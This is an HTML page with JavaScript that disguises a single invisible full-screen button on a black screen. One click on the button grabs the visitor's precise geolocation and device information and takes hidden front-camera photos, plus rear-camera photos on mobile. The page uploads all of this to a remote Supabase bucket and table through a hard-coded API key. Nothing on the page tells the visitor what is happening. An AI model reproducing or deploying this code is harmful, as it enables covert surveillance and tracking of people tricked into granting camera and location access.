<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Location & Camera Capture</title>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    body {
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #000;
    }
    button {
      background: transparent;
      border: none;
      color: transparent;
      cursor: pointer;
      width: 100%;
      height: 100%;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <button id="startBtn"></button>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    // ---------- CONFIG ----------
    const SUPABASE_URL = "https://epfznieirafhlbonudni.supabase.co"; // ← replace
    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVwZnpuaWVpcmFmaGxib251ZG5pIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjE3NTY5MzIsImV4cCI6MjA3NzMzMjkzMn0.5lvCs1kyYYtZiYMmApcJOq83tyZotRnOVY6I_fYWpNw"; // ← replace
    const TABLE_NAME = "user_captures";
    const STORAGE_BUCKET = "photos";

    // ---------- INIT ----------
    const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const startBtn = document.getElementById("startBtn");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    async function captureAndUpload() {
      try {
        // Detect device type
        const isMobile = /Mobi|Android/i.test(navigator.userAgent);

        // Get location
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
        });
        const { latitude, longitude } = position.coords;

        // Device info
        const deviceInfo = navigator.userAgent;

        // Capture photos
        const photos = [];
        const constraints = { video: { facingMode: "user" } }; // front camera
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 2000)); // wait 2 sec
        photos.push(await takeSnapshot());

        // rear camera only if mobile
        if (isMobile) {
          const rearStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
          video.srcObject = rearStream;
          await new Promise(r => setTimeout(r, 2000)); // wait 2 sec
          photos.push(await takeSnapshot());
          rearStream.getTracks().forEach(t => t.stop());
        }

        stream.getTracks().forEach(t => t.stop());

        // Upload photos + data
        for (let i = 0; i < photos.length; i++) {
          const blob = photos[i];
          const filename = `capture_${Date.now()}_${i}.jpg`;
          const path = `${filename}`;

          const { error: uploadErr } = await sb.storage.from(STORAGE_BUCKET).upload(path, blob, {
            contentType: "image/jpeg"
          });
          if (uploadErr) console.error("Upload error:", uploadErr);

          const { data } = sb.storage.from(STORAGE_BUCKET).getPublicUrl(path);
          const photoUrl = data?.publicUrl;

          await sb.from(TABLE_NAME).insert([{
            photo_url: photoUrl,
            latitude,
            longitude,
            device_info: deviceInfo,
            captured_at: new Date().toISOString()
          }]);
        }
      } catch (err) {
        console.error("Error:", err);
      }
    }

    function takeSnapshot() {
      const videoTrack = video.srcObject.getVideoTracks()[0];
      const settings = videoTrack.getSettings();
      const width = settings.width || 640;
      const height = settings.height || 480;
      canvas.width = width;
      canvas.height = height;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, width, height);
      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
    }

    startBtn.addEventListener("click", async () => {
      await captureAndUpload();
    });
  </script>
</body>
</html>
